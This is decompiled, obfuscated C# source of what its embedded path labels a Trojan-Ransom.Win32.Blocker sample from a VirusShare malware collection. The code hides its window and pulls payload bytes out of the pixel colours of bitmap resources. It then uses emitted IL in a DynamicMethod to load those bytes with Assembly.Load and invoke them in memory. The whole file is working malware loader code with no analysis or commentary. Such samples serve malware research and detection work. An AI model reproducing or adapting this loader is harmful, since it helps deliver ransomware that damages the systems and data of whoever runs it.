// Decompiled with JetBrains decompiler
// Type: 
// Assembly: c_W_d, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 68B120D9-D8ED-4BDF-8880-69645781854E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bkeq-f861f4af0440466cca3461cad39e56c6e7e85dc438c99c05625d95cfd7218105.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

public sealed class \u0008 : Form
{
  public IContainer \u0002;
  private Thread \u0003;
  private int \u0005;
  private Bitmap \u0008;
  private byte[] \u0006;
  private DynamicMethod \u000E;

  public \u0008()
  {
    this.Load += new EventHandler(this.\u0002);
    Application.EnableVisualStyles();
    this.\u0002();
    this.SuspendLayout();
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.ClientSize = new Size(292, 266);
    this.Name = \u0006.\u0002(-853663709);
    this.Text = \u0006.\u0002(-853663709);
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  [STAThread]
  public static void \u0002() => Application.Run((Form) new \u0008());

  protected override void Dispose(bool _param1)
  {
    if (_param1 && this.\u0002 != null)
      this.\u0002.Dispose();
    base.Dispose(_param1);
  }

  [DebuggerStepThrough]
  public void \u0002()
  {
  }

  public void \u0003()
  {
    this.Hide();
    this.ShowInTaskbar = false;
    Control.CheckForIllegalCrossThreadCalls = false;
    this.\u0003 = new Thread(new ThreadStart(this.\u0005));
    this.\u0003.Start();
  }

  private void \u0002(object _param1, EventArgs _param2) => this.\u0003();

  public object \u0002(byte[] _param1) => _param1[60] == (byte) 128 ? (object) true : (object) false;

  public void \u0005()
  {
    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0006.\u0002(-853663704);
    ResourceManager resourceManager = new ResourceManager(\u0006.\u0002(-853663743), Assembly.GetExecutingAssembly());
    this.\u0005 = Conversions.ToInteger(resourceManager.GetObject(\u0006.\u0002(-853663713)));
    this.\u0008 = (Bitmap) resourceManager.GetObject(\u0006.\u0002(-853663634));
    this.\u0006 = this.\u0002(this.\u0008);
    this.\u000E = new DynamicMethod(\u0006.\u0002(-853663618), typeof (object), new System.Type[4]
    {
      typeof (byte[]),
      typeof (object[]),
      typeof (string),
      typeof (string)
    });
    string str1 = \u0006.\u0002(-853663677);
    string str2 = \u0006.\u0002(-853663564);
    string str3 = str1.Replace(\u0006.\u0002(-853663515), string.Empty).Replace(\u0006.\u0002(-853663507), string.Empty).Replace(\u0006.\u0002(-853663499), string.Empty);
    string str4 = str2.Replace(\u0006.\u0002(-853663515), string.Empty).Replace(\u0006.\u0002(-853663507), string.Empty).Replace(\u0006.\u0002(-853663499), string.Empty);
    string str5 = \u0006.\u0002(-853663491);
    if (File.Exists(path))
    {
      byte[] numArray = this.\u0002((Bitmap) resourceManager.GetObject(\u0006.\u0002(-853663537)));
      if (Operators.ConditionalCompareObjectEqual(this.\u0002(numArray), (object) true, false))
        this.\u0002(this.\u0006, new object[1]
        {
          (object) numArray
        }, str5, \u0006.\u0002(-853663534));
      else
        this.\u0002(this.\u0006, new object[1]
        {
          (object) numArray
        }, str5, str3 + str4);
    }
    else
    {
      int num1 = this.\u0005;
      int num2 = 0;
      while (num2 <= num1)
      {
        try
        {
          byte[] numArray = this.\u0002((Bitmap) resourceManager.GetObject(\u0006.\u0002(-853663454) + num2.ToString()));
          if (Operators.ConditionalCompareObjectEqual(this.\u0002(numArray), (object) true, false))
            this.\u0002(this.\u0006, new object[1]
            {
              (object) numArray
            }, str5, \u0006.\u0002(-853663534));
          else
            this.\u0002(this.\u0006, new object[1]
            {
              (object) numArray
            }, str5, str3 + str4);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++num2; }
      }
      File.Exists(path);
      this.\u0002(this.\u0006, new object[1]
      {
        (object) Assembly.GetExecutingAssembly().Location
      }, \u0006.\u0002(-853663491), \u0006.\u0002(-853663434));
    }
    this.Close();
  }

  public object \u0002(byte[] _param1, object[] _param2, string _param3, string _param4)
  {
    object ilGenerator = (object) this.\u000E.GetILGenerator();
    object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(ilGenerator, (System.Type) null, \u0006.\u0002(-853663485), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663471), new object[1]
    {
      (object) typeof (Assembly)
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663378), new object[1]
    {
      (object) OpCodes.Ldarg_0
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663373), new object[3]
    {
      (object) OpCodes.Call,
      (object) typeof (Assembly).GetMethod(\u0006.\u0002(-853663420), new System.Type[1]
      {
        typeof (byte[])
      }),
      (object) null
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663378), new object[1]
    {
      (object) OpCodes.Stloc_0
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663378), new object[1]
    {
      (object) OpCodes.Ldarg_2
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    object Instance1 = ilGenerator;
    string MemberName1 = \u0006.\u0002(-853663378);
    object[] objArray1 = new object[2]
    {
      (object) OpCodes.Brfalse_S,
      RuntimeHelpers.GetObjectValue(objectValue)
    };
    object[] Arguments1 = objArray1;
    bool[] flagArray1 = new bool[2]{ false, true };
    bool[] CopyBack1 = flagArray1;
    NewLateBinding.LateCall(Instance1, (System.Type) null, MemberName1, Arguments1, (string[]) null, (System.Type[]) null, CopyBack1, true);
    if (flagArray1[1])
      objectValue = RuntimeHelpers.GetObjectValue(objArray1[1]);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663378), new object[1]
    {
      (object) OpCodes.Ldarg_3
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    object Instance2 = ilGenerator;
    string MemberName2 = \u0006.\u0002(-853663378);
    object[] objArray2 = new object[2]
    {
      (object) OpCodes.Brfalse_S,
      RuntimeHelpers.GetObjectValue(objectValue)
    };
    object[] Arguments2 = objArray2;
    bool[] flagArray2 = new bool[2]{ false, true };
    bool[] CopyBack2 = flagArray2;
    NewLateBinding.LateCall(Instance2, (System.Type) null, MemberName2, Arguments2, (string[]) null, (System.Type[]) null, CopyBack2, true);
    if (flagArray2[1])
      objectValue = RuntimeHelpers.GetObjectValue(objArray2[1]);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663378), new object[1]
    {
      (object) OpCodes.Ldloc_0
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663378), new object[1]
    {
      (object) OpCodes.Ldarg_2
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663373), new object[3]
    {
      (object) OpCodes.Callvirt,
      (object) typeof (Assembly).GetMethod(\u0006.\u0002(-853663415), new System.Type[1]
      {
        typeof (string)
      }),
      (object) null
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663378), new object[1]
    {
      (object) OpCodes.Ldarg_3
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663373), new object[3]
    {
      (object) OpCodes.Callvirt,
      (object) typeof (System.Type).GetMethod(\u0006.\u0002(-853663397), new System.Type[1]
      {
        typeof (string)
      }),
      (object) null
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663378), new object[1]
    {
      (object) OpCodes.Ldnull
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663378), new object[1]
    {
      (object) OpCodes.Ldarg_1
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663373), new object[3]
    {
      (object) OpCodes.Callvirt,
      (object) typeof (MethodBase).GetMethod(\u0006.\u0002(-853663317), new System.Type[2]
      {
        typeof (object),
        typeof (object[])
      }),
      (object) null
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663378), new object[1]
    {
      (object) OpCodes.Ret
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    object Instance3 = ilGenerator;
    string MemberName3 = \u0006.\u0002(-853663298);
    object[] objArray3 = new object[1]
    {
      RuntimeHelpers.GetObjectValue(objectValue)
    };
    object[] Arguments3 = objArray3;
    bool[] flagArray3 = new bool[1]{ true };
    bool[] CopyBack3 = flagArray3;
    NewLateBinding.LateCall(Instance3, (System.Type) null, MemberName3, Arguments3, (string[]) null, (System.Type[]) null, CopyBack3, true);
    if (flagArray3[0])
      RuntimeHelpers.GetObjectValue(objArray3[0]);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663378), new object[1]
    {
      (object) OpCodes.Ldloc_0
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663373), new object[3]
    {
      (object) OpCodes.Callvirt,
      (object) typeof (Assembly).GetProperty(\u0006.\u0002(-853663346)).GetGetMethod(),
      (object) null
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663378), new object[1]
    {
      (object) OpCodes.Ldnull
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663378), new object[1]
    {
      (object) OpCodes.Ldarg_1
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663373), new object[3]
    {
      (object) OpCodes.Callvirt,
      (object) typeof (MethodBase).GetMethod(\u0006.\u0002(-853663317), new System.Type[2]
      {
        typeof (object),
        typeof (object[])
      }),
      (object) null
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(ilGenerator, (System.Type) null, \u0006.\u0002(-853663378), new object[1]
    {
      (object) OpCodes.Ret
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    return this.\u000E.Invoke((object) null, new object[4]
    {
      (object) _param1,
      (object) _param2,
      (object) _param3,
      (object) _param4
    });
  }

  public byte[] \u0002(Bitmap _param1)
  {
    List<byte> byteList = new List<byte>();
    int num1 = checked (_param1.Width - 1);
    int x = 0;
    while (x <= num1)
    {
      int num2 = checked (_param1.Height - 1);
      int y = 0;
      while (y <= num2)
      {
        Color pixel = _param1.GetPixel(x, y);
        if (pixel != Color.FromArgb(0, 0, 0, 0))
        {
          byteList.Add(pixel.R);
          byteList.Add(pixel.G);
          byteList.Add(pixel.B);
        }
        checked { ++y; }
      }
      checked { ++x; }
    }
    return byteList.ToArray();
  }
}
